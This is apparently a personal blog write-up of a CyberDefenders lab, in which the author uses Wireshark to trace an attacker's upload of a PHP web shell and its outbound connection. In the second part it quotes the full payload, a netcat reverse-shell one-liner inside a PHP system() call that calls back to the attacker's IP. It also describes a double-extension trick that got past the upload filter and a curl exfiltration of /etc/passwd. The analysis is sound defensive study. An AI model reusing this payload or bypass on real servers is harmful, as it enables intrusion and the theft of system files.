---
layout: post
title: "Web Attack Lab"
author: "Nicholas Coleman"
date: 2025-03-05
tags: cyberdefenders
---
### a vulnerable web server
#### the task
*A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.*  
*Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.*

#### Pt. 1
Tasked with finding out what exactly happened that flagged the anomaly, my first goal was to find out where this unauthorized activity was coming from. Going through the packet capture, I noticed that the source IP address, belonging to the potential threat actor, was 117.11.88.124. Using an online IP geolocation service, I was able to quickly find out that this IP was located in Tianjin, China.

![the IP location](/security.github.io/images/ip_geolocation.png)

Although the IP address belonging to someone in China was already a bit suspicious, I needed more evidence of it being malicious. My next plan of action? To find out the User-Agent associated with this address. Since attackers often spoof User-Agent strings to mask the tools they use as legitimate browsers/applications, finding the User-Agent string was imperative.

Since I was already in Wireshark, that wouldn't be too difficult. All that needs to be done is to inspect a captured HTTP GET request. Easily done by following an HTTP stream.

`*Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0*`

It looks like the attacker was using a Linux-based Firefox browser, which could help him blend in with the rest of the traffic. This is valuable information, because it can help detect future attempts easily.

Next, I needed to see if the attacker exploited any vulnerabilities on the company web server. They most likely uploaded malicious code to allow themselves remote control over the server. This is otherwise known as the *web shell*. 

To do that, I needed to isolate all of the HTTP POST requests coming from the attacker's IP address. 

`ip.src == 117.11.88.124 and http.request.method == "POST"`

![The first attempt](/security.github.io/images/fail_attempt_1.png)

Here the attacker is trying to upload a malicious script, innocently named, "image.php". 

Attackers will often name malicious files with innocuous names, so as to avoid suspicion. But the very fact that a mysterious IP address is attempting to inject a PHP script into the company web server is enough by itself.

![Part 2](/security.github.io/images/fail_attempt_2.png)

See their IP address nestled in that PHP script? That alone is suspicious, and supported my conclusion that the attacker was trying to establish a reverse shell. Clearly, they are with the `system` function. It seems this first attempt was a failure however. The company web server's filters were able to stop the malicious file from executing. 

![sucess](/security.github.io/images/attack_success.png)

The second attempt was successful though, and the malicious PHP file was uploaded succesfully. It was able to bypass the server's filtering, most likely because the attacker tricked the filtering mechanism by adding a .jpg extension before the .php extension. This effectively made the server bug out, because it read the .jpg extension first, and probably assumed it was just an innocent photo. 

Well, it wasn't. The input validation mechanism of this server should definitely be updated! A vulnerability like this could end up being catastrophic. 

---

#### Pt. 2

My next step was to identify the web server's directory that is used for storing uploaded files. This is crucial to locating the malicious upload, and locating the vulnerable page. To do that, I would have to find the URI identifying that directory. So I entered the following:

`http.request.uri contains "image.jpg.php"`

From there I found out the web server uses the directory: /reviews/uploads/ for storing uploaded files. At this point, mentioning this vulnerability would be my priority in the real world, and as an entry-level analyst I would most likely escalate this issue. Escalation makes sense because the attacker is exploiting important server infrastructure. 

Finding the port used by the attacker was also simple. It is located within the content of the uploaded web shell file. 

`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`

By examining the content of this file, I was able to notice this part: *nc 117.11.88.124 8080*. This reveals to me that the attacker was using netcat (nc) to attempt to establish a connection back to the attacker's system, while using port 8080. 

This information is vital when investigating a breach such as this one. Finding the port number helps in identifying the attacker's method as well as help in configuring the firewall/IDS systems to block 8080 connections in the future, if they are unneeded. 

My last step involves finding out the exact name of the file that the attacker attempted to exfiltrate. To do that, I entered a query in that would isolate data being sent from the victim web server using port 8080 (the same port the attacker was using). 

`(tcp.port == 8080) && (ip.src == 24.49.63.79)`

![curl evidence](/security.github.io/images/curl_evidence.png)

I was quickly able to find that the attacker used curl to attempt to exfiltrate etc/passwd. Obviously, that is a critical file, as it contains information on all system users. Nowadays, passwords are stored in shadow files, so the passwords are going to be safe. But in terms of value, etc/passwd is extremely useful for attackers. 

It can help them map the network out, and give them knowledge as to areas they can exploit. It is extremely valuable recon intel. 

---
#### Summary

With that, I was finished with the task at hand. This was a fun lab! Using Wireshark to figure out exactly what happened is almost like being a digital detective. It feels like a puzzle waiting to be solved. Although at times it can be frustrating, the process does feel intuitive after a while. 

Here are my findings in a concise 5W format. 

1. WHO: `117.11.88.124` (located in Tianjin, China)
2. WHERE: Vulnerable web server, using Port 8080
3. WHEN: Thu, 30 Nov 2023 18:44:19 GMT
4. WHAT: Malicious php script uploaded on web server
5. WHY: For the purpose of exfiltrating etc/passwd 

Thank you for reading through my first blog post! More will be coming shortly. I will try and upload most of the labs I work on, if they are in anyway interesting. 
